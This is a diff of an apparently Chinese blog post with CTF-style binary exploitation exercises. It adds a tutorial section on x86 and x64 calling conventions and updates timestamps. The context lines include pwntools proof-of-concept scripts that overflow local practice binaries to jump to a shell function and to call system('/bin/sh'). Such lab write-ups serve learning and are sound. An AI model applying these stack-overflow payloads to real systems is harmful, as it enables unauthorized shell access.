@@ -164,7 +164,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2026-01-05 18:10:10
+          2026-01-07 01:43:38
         </span>
         
               <span class="post-tags">
@@ -202,7 +202,7 @@
 <p>因为是64位，0x80的偏移，poc如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;../practices/pwn0/level0&#x27;</span>)</span><br><span class="line"><span class="comment"># shell address in elf</span></span><br><span class="line">callsys_addr = elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;../practices/pwn0/level0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;World\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64 bit</span></span><br><span class="line"><span class="comment"># callsys_addr 后面+1 、+2 、+4都可</span></span><br><span class="line">payload= cyclic(<span class="number">8</span> * <span class="number">16</span> + <span class="number">8</span>) + p64(callsys_addr + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20251215021241035.png" alt="image-20251215021241035"></p>
-<p><strong>为什么要在callsys_addr那里+1？其实还可以+2、+4。</strong></p>
+<h3 id="为什么要在callsys-addr那里-1？其实还可以-2、-4。">为什么要在callsys_addr那里+1？其实还可以+2、+4。</h3>
 <p>根本原因是在Ubuntu 18.04及更高版本（即glibc版本较高）的64位系统的GLIBC的栈对齐导致的。</p>
 <p>x86-64 System V ABI（应用程序二进制接口）中的栈对齐（Stack Alignment）检查，具体表现为MOVAPS指令引发的Crash。</p>
 <p>在64位Linux系统重，ABI规定：在调用<code>call</code>指令进入一个函数之前，栈顶指针<code>RSP</code>必须是16字节对齐的（即RSP的地址以<code>0x0</code>结尾）。</p>
@@ -314,6 +314,123 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../practices/pwn2/level2&#x27;</span>)</span><br><span class="line">systemaddr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binshaddr = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="comment"># print(hex(systemaddr))</span></span><br><span class="line"><span class="comment"># print(hex(binshaddr))</span></span><br><span class="line">io = process(<span class="string">&#x27;../practices/pwn2/level2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> *(<span class="number">136</span> + <span class="number">4</span>),systemaddr, <span class="string">b&#x27;B&#x27;</span> * <span class="number">4</span>, binshaddr])</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p>注意systemaddr、binshaddr地址要为整数。</p>
 <h2 id="level3-pwn2-x64">level3: pwn2_x64</h2>
+<p>x86是32位，x64是64位，x64的64位传参和x86的32位传参完全是不一样的。这道题是x64的文件。</p>
+<p>首先是看安全防护：</p>
+<p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260107013638205.png" alt="image-20260107013638205"></p>
+<p>IDA反编译，看漏洞点。</p>
+<p><img src="/2025/12/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%88%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260107013740685.png" alt="image-20260107013740685"></p>
+<p>偏移为0x80，再覆盖一个rbp是8字节。所以，要覆盖0x88字节，再去填充攻击的返回地址。</p>
+<h3 id="x86（32位）参数传递—栈为核心。（Linux-常见）">x86（32位）参数传递—栈为核心。（Linux &amp; 常见）</h3>
+<p>特点：参数从右到左压栈、调用者清理栈，返回值在<code>eax</code> 。</p>
+<p>C代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<p>汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 2      ; b</span><br><span class="line">push 1      ; a</span><br><span class="line">call add</span><br><span class="line">add esp, 8  ; 调用者清理栈</span><br></pre></td></tr></table></figure>
+<p>函数内部</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add:</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line">    mov eax, [ebp+8]   ; a</span><br><span class="line">    add eax, [ebp+12]  ; b</span><br><span class="line">    pop ebp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
+<p>参数位置规律</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">ebp+8</span>]  -&gt; 第<span class="number">1</span>个参数</span><br><span class="line">[<span class="meta">ebp+12</span>] -&gt; 第<span class="number">2</span>个参数</span><br><span class="line">[<span class="meta">ebp+16</span>] -&gt; 第<span class="number">3</span>个参数</span><br></pre></td></tr></table></figure>
+<p>x86的本质总结：所有的参数都在栈上，访问参数 = 通过<code>ebp + offset</code>，函数调用开销较大（频繁内存访问）。</p>
+<h3 id="x64（64位）减少内存访问，提升函数调用性能。（Linux-macOS）">x64（64位）减少内存访问，提升函数调用性能。（Linux/macOS）</h3>
+<p><strong>先使用寄存器传参</strong>，栈只作为补充。</p>
+<p>参数传递顺序，<strong>前6个整数、指针参数使用寄存器存储：</strong></p>
+<table>
+<thead>
+<tr>
+<th>参数序号</th>
+<th>寄存器</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>第1个</td>
+<td>RDI</td>
+</tr>
+<tr>
+<td>第2个</td>
+<td>RSI</td>
+</tr>
+<tr>
+<td>第3个</td>
+<td>RDX</td>
+</tr>
+<tr>
+<td>第4个</td>
+<td>RCX</td>
+</tr>
+<tr>
+<td>第5个</td>
+<td>R8</td>
+</tr>
+<tr>
+<td>第6个</td>
+<td>R9</td>
+</tr>
+</tbody>
+</table>
+<p>第7个参数及以后，走栈。</p>
+<p>C代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">add</span><span class="params">(<span class="type">long</span> a, <span class="type">long</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<p>汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 1   ; a</span><br><span class="line">mov rsi, 2   ; b</span><br><span class="line">call add</span><br></pre></td></tr></table></figure>
+<p>函数内部</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add:</span><br><span class="line">    mov rax, rdi</span><br><span class="line">    add rax, rsi</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
+<p>对比x86，没有<code>push</code>，没有<code>ebp</code>，没有栈偏移访问参数。</p>
+<p>对于超过6个参数的x64的情况，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">f</span><span class="params">(<span class="type">long</span> a, <span class="type">long</span> b, <span class="type">long</span> c, <span class="type">long</span> d, <span class="type">long</span> e, <span class="type">long</span> f, <span class="type">long</span> g)</span>;</span><br></pre></td></tr></table></figure>
+<p>寄存器</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span> → rdi</span><br><span class="line"><span class="selector-tag">b</span> → rsi</span><br><span class="line">c → rdx</span><br><span class="line">d → rcx</span><br><span class="line">e → r8</span><br><span class="line">f → r9</span><br></pre></td></tr></table></figure>
+<p>栈：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">g</span> → <span class="selector-attr">[rsp + 8]</span></span><br></pre></td></tr></table></figure>
+<h3 id="x64（Windows）—-Miscrosoft-x74-ABI">x64（Windows）— Miscrosoft x74 ABI</h3>
+<p>前4个参数用寄存器：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>寄存器</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>第1个参数</td>
+<td>RCX</td>
+</tr>
+<tr>
+<td>第2个参数</td>
+<td>RDX</td>
+</tr>
+<tr>
+<td>第3个参数</td>
+<td>R8</td>
+</tr>
+<tr>
+<td>第4个参数</td>
+<td>R9</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Shadow Space（重点！！）</strong></p>
+<ul>
+<li>调用者必须在栈上预留32字节。</li>
+<li>即使参数全走寄存器也必须留。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub rsp, 40h   ; 32 字节 shadow space + 对齐</span><br><span class="line">call func</span><br><span class="line">add rsp, 40h</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这是 Windows x64 和 Linux x64 最大的差异之一</p>
+</blockquote>
+<p>所以看寄存器可以判断架构：</p>
+<ul>
+<li>
+<p><code>push ebp / mov ebp, esp</code> → <strong>x86</strong></p>
+</li>
+<li>
+<p><code>mov rdi, rsi, rdx</code> → <strong>Linux x64</strong></p>
+</li>
+<li>
+<p><code>mov rcx, rdx, r8</code> → <strong>Windows x64</strong></p>
+</li>
+</ul>
 <h2 id="level3">level3</h2>
 <p>和上一题类似，这题没有<code>system</code>函数了。</p>
 <p>防护检查。</p>
@@ -343,7 +460,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2026-01-05 18:10:10
+              2026-01-07 01:43:38
             </span>
             
                   <span class="post-tags">
@@ -383,7 +500,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0-pwn0"><span class="toc-text">level0: pwn0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1-pwn1"><span class="toc-text">level1: pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2-pwn2"><span class="toc-text">level2: pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3-pwn2-x64"><span class="toc-text">level3: pwn2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0-pwn0"><span class="toc-text">level0: pwn0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%9C%A8callsys-addr%E9%82%A3%E9%87%8C-1%EF%BC%9F%E5%85%B6%E5%AE%9E%E8%BF%98%E5%8F%AF%E4%BB%A5-2%E3%80%81-4%E3%80%82"><span class="toc-text">为什么要在callsys_addr那里+1？其实还可以+2、+4。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1-pwn1"><span class="toc-text">level1: pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2-pwn2"><span class="toc-text">level2: pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3-pwn2-x64"><span class="toc-text">level3: pwn2_x64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x86%EF%BC%8832%E4%BD%8D%EF%BC%89%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E2%80%94%E6%A0%88%E4%B8%BA%E6%A0%B8%E5%BF%83%E3%80%82%EF%BC%88Linux-%E5%B8%B8%E8%A7%81%EF%BC%89"><span class="toc-text">x86（32位）参数传递—栈为核心。（Linux &amp; 常见）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x64%EF%BC%8864%E4%BD%8D%EF%BC%89%E5%87%8F%E5%B0%91%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%EF%BC%8C%E6%8F%90%E5%8D%87%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%80%A7%E8%83%BD%E3%80%82%EF%BC%88Linux-macOS%EF%BC%89"><span class="toc-text">x64（64位）减少内存访问，提升函数调用性能。（Linux&#x2F;macOS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x64%EF%BC%88Windows%EF%BC%89%E2%80%94-Miscrosoft-x74-ABI"><span class="toc-text">x64（Windows）— Miscrosoft x74 ABI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
       
     </div>
   </div>
